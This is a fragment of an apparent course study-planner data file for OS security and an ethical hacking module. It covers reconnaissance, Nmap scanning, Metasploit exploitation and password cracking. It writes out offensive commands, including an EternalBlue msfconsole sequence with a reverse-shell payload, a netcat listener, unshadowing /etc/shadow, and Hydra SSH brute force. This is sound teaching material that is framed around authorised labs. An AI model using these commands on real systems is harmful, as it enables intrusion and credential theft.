{title:"Kernel I/O layer stack",body:"From user to hardware:<ul><li>User process → kernel I/O subsystem → device driver → controller hardware</li><li>Abstraction means applications are device-independent</li><li>Kernel layer handles: scheduling, buffering, caching, spooling</li></ul>"},
{title:"Buffering, caching and spooling",body:"<ul><li><strong>Buffering</strong> — temporary storage bridging CPU/device speed mismatch</li><li><strong>Caching</strong> — recently accessed data in faster storage</li><li><strong>Spooling</strong> — queue jobs for single-user device (e.g. printer)</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"2 hrs",task:"Interrupts and polling",detail:"Draw event sequence from device interrupt to ISR return. Compare polling vs interrupt-driven."},
{week:"Week 2",color:"#639922",hours:"3 hrs",task:"DMA and kernel layers",detail:"Trace a disk read through every layer from user process to hardware and back."},
{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Definitions and past papers",detail:"Define buffering, caching and spooling precisely — they are commonly confused in exams."}],
practice:["Trace sequence from user disk read() call to data returned in buffer","Compare polling vs interrupt-driven I/O — when is polling ever appropriate?","Why is DMA necessary for modern high-speed storage devices?","Distinguish buffering from caching with one example each"],
resources:[{name:"OS Concepts Ch.12 — Silberschatz",desc:"Full I/O chapter"},{name:"Ben Eater — interrupts (YouTube)",desc:"Hardware-level explanation"},{name:"Linux Device Drivers (free online)",desc:"Driver architecture reference"}]},

{name:"Security model",sub:"Privilege rings, Linux permissions, DAC/MAC/RBAC, VMs vs containers",
overview:"OS security via hardware privilege levels and access control models is the foundation of system security — and connects directly to the Linux and Ethical Hacking modules.",
concepts:[
{title:"CPU privilege rings",body:"<ul><li><strong>Ring 0 (kernel mode)</strong> — full hardware access</li><li><strong>Ring 3 (user mode)</strong> — restricted; applications run here</li><li>User programs access hardware via <strong>system calls</strong> — controlled Ring 3→Ring 0 transitions via trap instruction</li><li>Prevents applications accessing hardware directly or reading other processes' memory</li></ul>"},
{title:"Linux file permissions",body:"Three rwx sets: owner | group | others<ul><li>chmod 755 = rwxr-xr-x (r=4, w=2, x=1)</li><li><strong>setuid</strong> — execute as file owner (passwd runs as root)</li><li><strong>sticky bit</strong> — only owner deletes own files (/tmp)</li><li>Find setuid: <code>find / -perm -4000 2>/dev/null</code></li></ul>"},
{title:"Access control models",body:"<ul><li><strong>DAC</strong> — owner controls access (Unix permissions, ACLs)</li><li><strong>MAC</strong> — admin sets policy, users can't override (SELinux, AppArmor)</li><li><strong>RBAC</strong> — permissions on roles; users assigned to roles</li></ul>"},
{title:"VMs vs containers",body:"<ul><li><strong>Type 1 hypervisor</strong> — bare metal; each VM has own kernel (ESXi, KVM)</li><li><strong>Type 2 hypervisor</strong> — on host OS (VirtualBox, VMware Workstation)</li><li><strong>Containers</strong> — share host kernel; isolated user space (Docker)</li><li>VMs: stronger isolation. Containers: lighter but kernel exploit can escape</li></ul>"}],
timeline:[
{week:"Week 1",color:"#3B6D11",hours:"2 hrs",task:"Privilege rings",detail:"Trace the path of a system call. Explain why privilege separation exists."},
{week:"Week 2",color:"#639922",hours:"3 hrs",task:"Linux permissions",detail:"Practice chmod, chown, getfacl/setfacl. Find all setuid binaries on your VM."},
{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Access control models",detail:"Compare DAC/MAC/RBAC with examples. Compare VM vs container security."}],
practice:["Decode -rwsr-x--- and explain every component","Difference between DAC and MAC — one real example each","How does a system call transition from user mode to kernel mode?","Security pros and cons of containers vs virtual machines"],
resources:[{name:"DigitalOcean — Linux permissions guide",desc:"Practical chmod, chown, ACL reference"},{name:"SELinux documentation",desc:"MAC on Linux"},{name:"Docker security overview",desc:"How containers achieve isolation"}]}
]},

{id:"eh",name:"Ethical Hacking: Tools & Techniques",shortName:"Eth. Hacking",icon:"ti-shield-lock",bg:"#FAECE7",iconColor:"#993C1D",meta:"Core module · SCQF Level 8",
desc:"Introduces ethical hacking methodology and penetration testing tools. Lab reports must follow a professional structure with screenshots and clear explanations at every step.",
assess:[{l:"Practical",r:"Pentest lab report — 60%"},{l:"Theory",r:"Exam / quiz — 40%"}],
topics:[
{name:"Phases of hacking",sub:"CEH 5 phases, rules of engagement, pentest types, report writing",
overview:"Every lab report must follow the CEH methodology structure. Theory exams test knowledge of each phase, legal context, and the difference between test types.",
concepts:[
{title:"The five CEH phases",body:"<ol style='margin:6px 0 0 1.2rem'><li><strong>Reconnaissance</strong> — gather info (passive and active)</li><li><strong>Scanning</strong> — probe for open ports, services, vulnerabilities</li><li><strong>Gaining access</strong> — exploit a vulnerability</li><li><strong>Maintaining access</strong> — persistence, backdoors</li><li><strong>Clearing tracks</strong> — delete logs, hide presence</li></ol>In ethical hacking: all agreed in writing, all steps documented, no harm caused."},
{title:"Rules of engagement",body:"Define before any test:<ul><li><strong>Scope</strong> — which IPs/systems in or out</li><li><strong>Authorisation</strong> — written permission (legal protection under CMA 1990)</li><li><strong>Timeline</strong> — agreed window to minimise disruption</li><li><strong>Communication</strong> — who to contact on critical finding</li></ul>"},
{title:"Pentest types",body:"<ul><li><strong>Black box</strong> — no prior knowledge; simulates external attacker</li><li><strong>White box</strong> — full info: source code, network diagrams</li><li><strong>Grey box</strong> — partial knowledge (e.g. user credentials)</li><li><strong>Internal</strong> — from inside the network</li><li><strong>Social engineering</strong> — test human vulnerabilities</li></ul>"},
{title:"Report structure",body:"<ul><li><strong>Executive summary</strong> — non-technical for management</li><li><strong>Scope and methodology</strong></li><li><strong>Findings</strong> — each vuln with CVSS severity, evidence screenshots, impact, remediation</li><li><strong>Risk rating</strong> — Critical/High/Medium/Low/Info</li></ul>Missing screenshots or unexplained steps lose marks."}],
timeline:[

{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"ROE and pentest types",detail:"Study rules of engagement and test types — they appear frequently in theory exams."},
{week:"Week 3",color:"#F0997B",hours:"3 hrs",task:"Report writing practice",detail:"Write a mock pentest finding. Focus on evidence, description and specific remediation."}],

{name:"Reconnaissance",sub:"OSINT, passive vs active, DNS enumeration, Google dorks",
overview:"Recon gathers target information before any systems are touched. Passive leaves no trace; active interacts with target systems. Both are assessed in labs and theory exams.",
concepts:[
{title:"Passive vs active recon",body:"<strong>Passive</strong> — no direct contact, no logs on target:<ul><li>OSINT: Google, LinkedIn, WHOIS, Shodan, theHarvester</li></ul><strong>Active</strong> — directly interacting with target:<ul><li>DNS queries to target nameservers, social engineering</li><li>Leaves traces — higher detection risk</li></ul>"},
{title:"OSINT tools",body:"<ul><li><strong>Google dorks</strong>: <code>site:target.com filetype:pdf</code>, <code>intitle:\"index of\"</code></li><li><strong>Shodan</strong> — search engine for internet-connected devices</li><li><strong>WHOIS</strong> — domain owner, registrar, registration dates</li><li><strong>theHarvester</strong> — emails, names, subdomains from public sources</li><li><strong>Maltego</strong> — visualises entity relationships</li></ul>"},
{title:"DNS enumeration",body:"<ul><li><code>nslookup domain.com</code>, <code>dig domain.com ANY</code></li><li>Record types: A (IPv4), AAAA (IPv6), MX (mail), NS (nameserver), TXT, CNAME</li><li><strong>Zone transfer</strong>: <code>dig axfr @nameserver domain.com</code> — dumps all records if misconfigured. Major vuln if exposed</li><li>Practice against zonetransfer.me</li></ul>"},
{title:"Social media OSINT",body:"<ul><li>LinkedIn — employee names, tech stack in job posts</li><li>GitHub — code leaks, API keys in public repos</li><li><code>hunter.io</code> — find company email format</li><li><code>haveibeenpwned.com</code> — check emails in data breaches</li></ul>"}],
timeline:[
{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"OSINT tools",detail:"Practice Google dorks and theHarvester on a permitted domain. Document all findings."},
{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"DNS enumeration",detail:"Run dig against public domains. Attempt zone transfer against zonetransfer.me."},
{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Report writing",detail:"Every tool output needs a plain-English explanation — practise writing these up professionally."}],
practice:["Use theHarvester to gather emails for a public domain — write findings in report format","Attempt zone transfer against zonetransfer.me — document what you find","Find 3 Google dorks that could expose sensitive files on a target site","Explain the legal difference between passive and active reconnaissance under CMA 1990"],
resources:[{name:"OSINT Framework — osintframework.com",desc:"Visual map of all OSINT tools"},{name:"zonetransfer.me",desc:"Safe zone transfer practice target"},{name:"GHDB — exploit-db.com",desc:"Google Hacking Database of dork queries"}]},

{name:"Scanning & enumeration",sub:"Nmap flags, scan types, service detection, Netcat, Nessus",
overview:"Scanning identifies live hosts, open ports, services and OS versions. Nmap is the core tool — know every important flag, what each scan type reveals, and how to document findings.",
concepts:[
{title:"Nmap core flags",body:"<ul><li><code>-sS</code> — SYN/stealth (half-open, less logged); <code>-sT</code> — full TCP connect</li><li><code>-sU</code> — UDP scan; <code>-sV</code> — service version; <code>-O</code> — OS fingerprinting</li><li><code>-A</code> — aggressive (OS + version + scripts + traceroute)</li><li><code>-p 1-65535</code> — all ports; <code>-p 22,80,443</code> — specific ports</li><li><code>--script vuln</code> — run vulnerability NSE scripts</li></ul>"},
{title:"Port states and scan types",body:"<ul><li><strong>open</strong> — service listening; <strong>closed</strong> — no service; <strong>filtered</strong> — firewall dropping packets</li><li>SYN scan: SYN → SYN-ACK → RST. Less logged, requires root</li><li>TCP connect: full 3-way handshake. Logged but no root needed</li></ul>"},
{title:"Banner grabbing with Netcat",body:"<ul><li><code>nc target 22</code> — reads SSH banner</li><li><code>nc target 80</code> then send <code>HEAD / HTTP/1.0</code></li><li><code>nc -lvnp 4444</code> — listen for incoming connections (reverse shells)</li><li>enum4linux — SMB enumeration; snmpwalk — SNMP</li></ul>"},
{title:"Vulnerability scanning",body:"<ul><li><strong>Nessus</strong> — commercial; prioritised CVE findings with CVSS scores</li><li><strong>OpenVAS</strong> — open-source alternative</li><li>Do NOT run against systems without explicit written permission</li></ul>"}],
timeline:[
{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"Nmap fundamentals",detail:"Run Nmap against Metasploitable2 with different flags. Document every flag and what it reveals."},
{week:"Week 2",color:"#D85A30",hours:"3 hrs",task:"Service enumeration",detail:"Practice banner grabbing with Netcat. Run enum4linux. Document all findings in report format."},
{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Vulnerability scanning",detail:"Run Nessus or OpenVAS in your lab. Interpret CVSS scores. Map findings to report structure."}],
practice:["Run nmap -sV -O -p 1-1024 against Metasploitable2 and document output","Compare SYN (-sS) vs TCP connect (-sT) — what differs in the server logs?","Banner grab ports 21, 22 and 80 on a practice target using Netcat","Explain what 'filtered' means in Nmap output and what it implies"],
resources:[{name:"Nmap reference guide — nmap.org/book",desc:"Definitive Nmap documentation"},{name:"Metasploitable2 setup guide",desc:"Intentionally vulnerable VM"},{name:"TryHackMe — Nmap room",desc:"Guided interactive Nmap exercises"}]},

{name:"Exploitation",sub:"Metasploit, CVEs, payloads, reverse shells, Meterpreter",
overview:"Exploitation uses discovered vulnerabilities to gain access. Metasploit is the industry-standard framework. Lab reports must document every step with commands and screenshots.",
concepts:[
{title:"Metasploit module types",body:"<ul><li><strong>Exploits</strong> — take advantage of a specific vulnerability</li><li><strong>Payloads</strong> — code run after successful exploitation</li><li><strong>Auxiliaries</strong> — scanning, fuzzing, enumeration</li><li><strong>Post-exploitation</strong> — privilege escalation, pivoting, persistence</li><li><strong>Encoders</strong> — modify payload to evade AV</li></ul>"},
{title:"msfconsole workflow",body:"<pre>msfconsole\nsearch ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 192.168.1.10\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nexploit</pre>"},
{title:"Reverse vs bind shells and Meterpreter",body:"<ul><li><strong>Reverse shell</strong> — target connects back to attacker. Gets through firewalls. Most common</li><li><strong>Bind shell</strong> — attacker connects to port opened on target</li><li><strong>Meterpreter</strong> — in-memory advanced payload: upload/download, screenshot, keylogger, pivot</li></ul>"},
{title:"CVE database and CVSS",body:"<ul><li>CVE — unique identifier: CVE-YEAR-NUMBER</li><li>CVSS score 0-10: Critical (9+), High (7-8.9), Medium (4-6.9), Low (&lt;4)</li><li>NVD — nvd.nist.gov — full CVE database</li><li>Exploit-DB — exploit-db.com — public exploits; <code>searchsploit</code> CLI</li></ul>"}],

{week:"Week 3",color:"#F0997B",hours:"3 hrs",task:"CVE research",detail:"Find a CVE for a Metasploitable service. Look up on NVD. Try manual exploit alongside Metasploit."}],

{name:"Password attacks",sub:"Hash types, salts, John the Ripper, Hashcat, Hydra",
overview:"Password attacks are among the most effective offensive techniques. Understanding how passwords are stored and the tools to crack them is essential for attack and defence.",
concepts:[
{title:"How passwords are stored",body:"<ul><li><strong>Hash function</strong> — one-way, fixed-length output</li><li>MD5 — broken; SHA-1 — deprecated; SHA-256/512 — still used</li><li><strong>bcrypt</strong> — designed for passwords: includes salt, intentionally slow</li><li><strong>Salt</strong> — random data added before hashing; defeats rainbow tables</li></ul>"},
{title:"Attack types",body:"<ul><li><strong>Dictionary</strong> — try every word in wordlist (rockyou.txt: 14M passwords)</li><li><strong>Brute force</strong> — every combination. Guaranteed but slow for long passwords</li><li><strong>Rule-based</strong> — transform wordlist (capitalise, add numbers, l33t)</li><li><strong>Rainbow tables</strong> — precomputed hash→plaintext. Defeated by salting</li></ul>"},
{title:"John the Ripper and Hashcat",body:"<strong>John:</strong><ul><li><code>john hashes.txt --wordlist=rockyou.txt</code></li><li><code>john --show hashes.txt</code></li><li><code>unshadow /etc/passwd /etc/shadow > combined.txt</code></li></ul><strong>Hashcat (GPU-accelerated):</strong><ul><li><code>hashcat -m 0 hashes.txt rockyou.txt</code> (MD5)</li><li>Modes: 0=MD5, 100=SHA1, 1800=sha512crypt, 3200=bcrypt</li></ul>"},
{title:"Hydra — online brute force",body:"<ul><li><code>hydra -l admin -P rockyou.txt ssh://192.168.1.10</code></li><li><code>hydra -L users.txt -P passwords.txt ftp://target</code></li><li>Supports SSH, FTP, HTTP, RDP, SMB, MySQL and more</li><li>Only run against systems you are authorised to test</li></ul>"}],
timeline:[
{week:"Week 1",color:"#993C1D",hours:"3 hrs",task:"Hash types and salts",detail:"Understand why bcrypt differs from MD5. Generate hashes and understand the role of salts."},
{week:"Week 2",color:"#D85A30",hours:"4 hrs",task:"John and Hashcat",detail:"Crack MD5 and NTLM hashes with John using rockyou.txt. Try rule-based attacks."},
{week:"Week 3",color:"#F0997B",hours:"2 hrs",task:"Hydra online attacks",detail:"Practice Hydra against lab SSH. Document command and output in report format."}],
practice:["Generate MD5 and bcrypt hashes of the same password — compare their structure","Use John with rockyou.txt to crack a set of SHA-1 hashes","Explain why rainbow tables fail against properly salted passwords","Configure Hydra for SSH brute force against a lab VM — document your findings"],
